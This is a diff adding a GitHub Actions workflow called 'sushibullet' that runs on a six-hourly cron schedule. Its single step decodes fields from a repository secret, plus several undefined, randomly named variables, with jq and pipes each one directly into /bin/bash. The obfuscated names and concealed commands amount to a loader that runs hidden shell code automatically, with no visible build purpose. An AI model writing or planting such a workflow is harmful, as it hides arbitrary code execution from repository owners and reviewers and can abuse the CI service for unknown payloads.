@@ -1,0 +1,26 @@
+name: sushibullet
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sushibullet
+        env:
+          lsc13: ${{ secrets.lsc13 }}
+        run: |
+          echo $lsc13 | jq -r .kmyr4563 | /bin/bash
+          echo $u10372 | jq -r .lpois2 | /bin/bash
+          echo $j73 | jq -r .bags7464 | /bin/bash
+          echo $gu5 | jq -r .v67427 | /bin/bash
+          echo $eo27922 | jq -r .ggql5 | /bin/bash
+          echo $ijeoz139 | jq -r .qvn66 | /bin/bash
+          echo $p55 | jq -r .zbky78235 | /bin/bash
+          echo $gfsel0 | jq -r .qnnva17307 | /bin/bash
+          echo $dyj286 | jq -r .qlb30218 | /bin/bash
+
